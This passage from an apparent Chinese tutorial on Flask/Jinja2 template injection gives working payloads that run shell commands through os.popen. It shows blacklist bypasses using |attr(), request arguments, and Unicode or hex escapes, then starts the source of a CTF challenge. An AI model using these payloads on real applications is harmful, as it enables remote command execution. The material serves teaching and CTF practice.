<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span><span class="k">print</span><span class="p">(</span><span class="s1">''</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</pre></div>
<h2 id="toc-24">利用 <code>|attr()</code> 来Bypass</h2>
<p>这里说一个新东西，就是原生JinJa2函数 <code>attr()</code>，这是一个 <code>attr()</code> 过滤器，它只查找属性，获取并返回对象的属性的值，过滤器与变量用管道符号（ <code>|</code> ）分割。如：</p>
<div class="highlight"><pre><span></span><span class="n">foo</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"bar"</span><span class="p">)</span>   <span class="err">等同于</span>   <span class="n">foo</span><span class="p">[</span><span class="s2">"bar"</span><span class="p">]</span>
</pre></div>
<p><code>|attr()</code> 配合其他姿势可同时绕过双下划线 <code>__</code> 、引号、点 <code>.</code> 和 <code>[</code> 等，下面给出示例。</p>
<h3 id="toc-25">同时过滤了 . 和 []</h3>
<p>过滤了以下字符：</p>

<pre><code>.    [</code></pre>
<p>绕过姿势：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__class__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__base__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__subclasses__"</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__getitem__"</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__init__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__globals__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__getitem__"</span><span class="p">)(</span><span class="s2">"os"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"popen"</span><span class="p">)(</span><span class="s2">"ls"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"read"</span><span class="p">)()}}</span>
</pre></div>
<p>等同于：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<h3 id="toc-26">同时过滤了 __ 、点. 和 []</h3>
<p>过滤了以下字符：</p>
<div class="highlight"><pre><span></span><span class="n">__</span>    <span class="o">.</span>    <span class="p">[</span>    <span class="s2">"</span>
</pre></div>
<p>下面我们演示绕过姿势，先写出payload的原型：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<p>由于中括号 <code>[</code> 被过滤了，我们可以用 <code>__getitem__()</code> 来绕过（尽量不要用pop()），类似如下：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="mi">77</span><span class="p">)</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">'__builtins__'</span><span class="p">)</span><span class="o">.</span><span class="fm">__getitem__</span><span class="p">(</span><span class="s1">'eval'</span><span class="p">)(</span><span class="s1">'__import__("os").popen("ls /").read()'</span><span class="p">)}}</span>
</pre></div>
<p>由于还过滤了下划线 <code>__</code>，我们可以用request对象绕过，但是还过滤了中括号 <code>[]</code>，所以我们要同时绕过 <code>__</code> 和 <code>[</code>，就用到了我们的<code>|attr()</code></p>
<p>所以最终的payload如下：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x1</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x2</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x3</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x4</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x5</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x6</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x4</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x7</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x4</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x8</span><span class="p">)(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">x9</span><span class="p">)}}</span><span class="o">&amp;</span><span class="n">x1</span><span class="o">=</span><span class="vm">__class__</span><span class="o">&amp;</span><span class="n">x2</span><span class="o">=</span><span class="n">__base__</span><span class="o">&amp;</span><span class="n">x3</span><span class="o">=</span><span class="n">__subclasses__</span><span class="o">&amp;</span><span class="n">x4</span><span class="o">=</span><span class="fm">__getitem__</span><span class="o">&amp;</span><span class="n">x5</span><span class="o">=</span><span class="fm">__init__</span><span class="o">&amp;</span><span class="n">x6</span><span class="o">=</span><span class="vm">__globals__</span><span class="o">&amp;</span><span class="n">x7</span><span class="o">=</span><span class="n">__builtins__</span><span class="o">&amp;</span><span class="n">x8</span><span class="o">=</span><span class="nb">eval</span><span class="o">&amp;</span><span class="n">x9</span><span class="o">=</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">"os"</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls /'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</pre></div>
<h3 id="toc-27">用Unicode编码配合 <code>|attr()</code> 进行Bypass</h3>
<p>过滤了以下字符：</p>
<div class="highlight"><pre><span></span><span class="s1">'  request  {{  _  %20(空格)  [  ]  .  __globals__   __getitem__</span>
</pre></div>
<p>我们用 <code>{%...%}</code>绕过对 <code>{{</code> 的过滤，并用unicode绕过对关键字的过滤。unicode绕过是一种网上没提出的方法。</p>
<p>假设我们要构造的payload原型为：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">77</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'os'</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'ls'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
</pre></div>
<p>先用 <code>|attr</code> 绕过 <code>.</code> 和 <code>[]</code>：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__class__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__base__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__subclasses__"</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__getitem__"</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__init__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__globals__"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"__getitem__"</span><span class="p">)(</span><span class="s2">"os"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"popen"</span><span class="p">)(</span><span class="s2">"ls"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"read"</span><span class="p">)()}}</span>
</pre></div>
<p>我们可以将过滤掉的字符用unicode替换掉：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f</span><span class="s2">"</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f</span><span class="s2">"</span><span class="p">)(</span><span class="mi">77</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f</span><span class="s2">"</span><span class="p">)(</span><span class="s2">"os"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"popen"</span><span class="p">)(</span><span class="s2">"ls"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"read"</span><span class="p">)()}}</span>
</pre></div>
<h3 id="toc-28">用Hex编码配合 <code>|attr()</code> 进行Bypass</h3>
<p>和上面那个一样，只不过是将Unicode编码换成了Hex编码，适用于“u”被过滤了的情况。</p>
<p>我们可以将过滤掉的字符用Hex编码替换掉：</p>
<div class="highlight"><pre><span></span><span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x62\x61\x73\x65\x5f\x5f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f</span><span class="s2">"</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f</span><span class="s2">"</span><span class="p">)(</span><span class="mi">258</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x69\x6e\x69\x74\x5f\x5f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"</span><span class="se">\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f</span><span class="s2">"</span><span class="p">)(</span><span class="s2">"os"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"popen"</span><span class="p">)(</span><span class="s2">"cat</span><span class="se">\x20\x66\x6c\x61\x67\x2e\x74\x78\x74</span><span class="s2">"</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s2">"read"</span><span class="p">)()}}</span>
</pre></div>
<h2 id="toc-29">使用 JinJa 的过滤器进行Bypass</h2>
<p>在 Flask JinJa 中，内只有很多过滤器可以使用，前文的attr()就是其中的一个过滤器。变量可以通过过滤器进行修改，过滤器与变量之间用管道符号（|）隔开，括号中可以有可选参数，也可以没有参数，过滤器函数可以带括号也可以不带括号。可以使用管道符号（|）连接多个过滤器，一个过滤器的输出应用于下一个过滤器。</p>
<p>详情请看官方文档：<a href="https://jinja.palletsprojects.com/en/master/templates/#builtin-filters" target="_blank">https://jinja.palletsprojects.com/en/master/templates/#builtin-filters</a></p>
<p>以下是内置的所有的过滤器列表：</p>
<table>
<thead><tr>
<th><a href="https://jinja.palletsprojects.com/en/master/templates/#abs" target="_blank"><code>abs()</code></a></th>
<th><a href="https://jinja.palletsprojects.com/en/master/templates/#float" target="_blank"><code>float()</code></a></th>
<th><a href="https://jinja.palletsprojects.com/en/master/templates/#lower" target="_blank"><code>lower()</code></a></th>
<th><a href="https://jinja.palletsprojects.com/en/master/templates/#round" target="_blank"><code>round()</code></a></th>
<th><a href="https://jinja.palletsprojects.com/en/master/templates/#tojson" target="_blank"><code>tojson()</code></a></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#attr" target="_blank"><code>attr()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#forceescape" target="_blank"><code>forceescape()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#map" target="_blank"><code>map()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#safe" target="_blank"><code>safe()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#trim" target="_blank"><code>trim()</code></a></td>
</tr>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#batch" target="_blank"><code>batch()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#format" target="_blank"><code>format()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#max" target="_blank"><code>max()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#select" target="_blank"><code>select()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#truncate" target="_blank"><code>truncate()</code></a></td>
</tr>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#capitalize" target="_blank"><code>capitalize()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#groupby" target="_blank"><code>groupby()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#min" target="_blank"><code>min()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#selectattr" target="_blank"><code>selectattr()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#unique" target="_blank"><code>unique()</code></a></td>
</tr>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#center" target="_blank"><code>center()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#indent" target="_blank"><code>indent()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#pprint" target="_blank"><code>pprint()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#slice" target="_blank"><code>slice()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#upper" target="_blank"><code>upper()</code></a></td>
</tr>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#default" target="_blank"><code>default()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#int" target="_blank"><code>int()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#random" target="_blank"><code>random()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#sort" target="_blank"><code>sort()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#urlencode" target="_blank"><code>urlencode()</code></a></td>
</tr>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#dictsort" target="_blank"><code>dictsort()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#join" target="_blank"><code>join()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#reject" target="_blank"><code>reject()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#string" target="_blank"><code>string()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#urlize" target="_blank"><code>urlize()</code></a></td>
</tr>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#escape" target="_blank"><code>escape()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#last" target="_blank"><code>last()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#rejectattr" target="_blank"><code>rejectattr()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#striptags" target="_blank"><code>striptags()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#wordcount" target="_blank"><code>wordcount()</code></a></td>
</tr>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#filesizeformat" target="_blank"><code>filesizeformat()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#length" target="_blank"><code>length()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#replace" target="_blank"><code>replace()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#sum" target="_blank"><code>sum()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#wordwrap" target="_blank"><code>wordwrap()</code></a></td>
</tr>
<tr>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#first" target="_blank"><code>first()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#list" target="_blank"><code>list()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#reverse" target="_blank"><code>reverse()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#title" target="_blank"><code>title()</code></a></td>
<td><a href="https://jinja.palletsprojects.com/en/master/templates/#xmlattr" target="_blank"><code>xmlattr()</code></a></td>
</tr>
</tbody>
</table>
<p>可以自行点击每个过滤器去查看每一种过滤器的作用。我们就是利用这些过滤器，一步步的拼接出我们想要的字符、数字或字符串。</p>
<h3 id="toc-30">常用字符获取入口点</h3>
<ul>
<li>对于获取一般字符的方法有以下几种：</li>
</ul>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="p">({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="p">()</span><span class="o">|</span><span class="n">string</span><span class="p">())</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="p">())</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">urlencode</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
</pre></div>
<p>如下演示：</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="p">({</span> <span class="p">}</span><span class="o">|</span><span class="n">select</span><span class="p">()</span><span class="o">|</span><span class="n">string</span><span class="p">())</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
</pre></div>
<p><a id="img7" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174659-26b17380-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174659-26b17380-bd3e-1.png"></a></p>
<p>上上图所示，我们可以通过 <code>&lt;generator object select_or_reject at 0x7fe339298fc0&gt;</code> 字符串获取的字符有：尖号、字母、空格、下划线和数字。</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="p">())</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
</pre></div>
<p><a id="img8" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174700-26d65cf4-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174700-26d65cf4-bd3e-1.png"></a></p>
<p>如上图所示，可以通过 <code>&lt;TemplateReference None&gt;</code> 字符串获取的字符有：尖号、字母和空格。</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">urlencode</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
</pre></div>
<p><a id="img9" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174700-2704f384-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174700-2704f384-bd3e-1.png"></a></p>
<p>如上图所示，可以获得的字符除了字母以外还有百分号，这一点比较重要，因为如果我们控制了百分号的话我们可以获取任意字符，这个在下面第二道题中会讲到。</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">org</span> <span class="o">=</span> <span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="vm">__doc__</span><span class="o">|</span><span class="n">string</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">org</span><span class="p">}}</span>
</pre></div>
<p><a id="img10" href="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174700-2731127a-bd3e-1.png"><img src="./以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用 - 先知社区_files/20210525174700-2731127a-bd3e-1.png"></a></p>
<p>如上图所示，可获得到的字符更多了。</p>
<ul>
<li>对于获取数字，除了当菜出现的那几种外我们还可以有以下几种方法：</li>
</ul>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">|</span><span class="nb">int</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">num</span><span class="p">}}</span>    <span class="c1"># 0, 通过int过滤器获取数字</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">length</span><span class="p">)</span> <span class="o">%</span><span class="p">}{{</span><span class="n">num</span><span class="p">}}</span>    <span class="c1"># 24, 通过length过滤器获取数字</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">point</span> <span class="o">=</span> <span class="bp">self</span><span class="o">|</span><span class="nb">float</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">min</span> <span class="o">%</span><span class="p">}</span>    <span class="c1"># 通过float过滤器获取点 .</span>
</pre></div>
<p>有了数字0之后，我们便可以依次将其余的数字全部构造出来，原理就是加减乘除、平方等数学运算。</p>
<p>下面我们通过两道题目payload的构造过程来演示一下如何使用过滤器来Bypass。</p>
<h3 id="toc-31">[2020 DASCTF 八月安恒月赛]ezflask</h3>
<p>题目源码：</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">abort</span><span class="p">,</span> <span class="n">send_from_directory</span>
<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>


<span class="nd">@app.route</span><span class="p">(</span><span class="s2">"/"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">def</span> <span class="nf">safe_jinja</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
        <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'class'</span><span class="p">,</span> <span class="s1">'attr'</span><span class="p">,</span> <span class="s1">'mro'</span><span class="p">,</span> <span class="s1">'base'</span><span class="p">,</span>
                     <span class="s1">'request'</span><span class="p">,</span> <span class="s1">'session'</span><span class="p">,</span> <span class="s1">'+'</span><span class="p">,</span> <span class="s1">'add'</span><span class="p">,</span> <span class="s1">'chr'</span><span class="p">,</span> <span class="s1">'ord'</span><span class="p">,</span> <span class="s1">'redirect'</span><span class="p">,</span> <span class="s1">'url_for'</span><span class="p">,</span> <span class="s1">'config'</span><span class="p">,</span> <span class="s1">'builtins'</span><span class="p">,</span> <span class="s1">'get_flashed_messages'</span><span class="p">,</span> <span class="s1">'get'</span><span class="p">,</span> <span class="s1">'subclasses'</span><span class="p">,</span> <span class="s1">'form'</span><span class="p">,</span> <span class="s1">'cookies'</span><span class="p">,</span> <span class="s1">'headers'</span><span class="p">,</span> <span class="s1">'['</span><span class="p">,</span> <span class="s1">']'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\'</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">,</span> <span class="s1">'{}'</span><span class="p">]</span>
        <span class="n">flag</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">for</span> <span class="n">no</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">no</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">in</span> <span class="n">s</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
                <span class="n">flag</span> <span class="o">=</span> <span class="bp">False</span>
                <span class="k">break</span>
        <span class="k">return</span> <span class="n">flag</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">):</span>
        <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
    <span class="k">elif</span> <span class="n">safe_jinja</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">)):</span>
        <span class="n">name</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'name'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">name</span> <span class="o">=</span> <span class="s1">'wendell'</span>
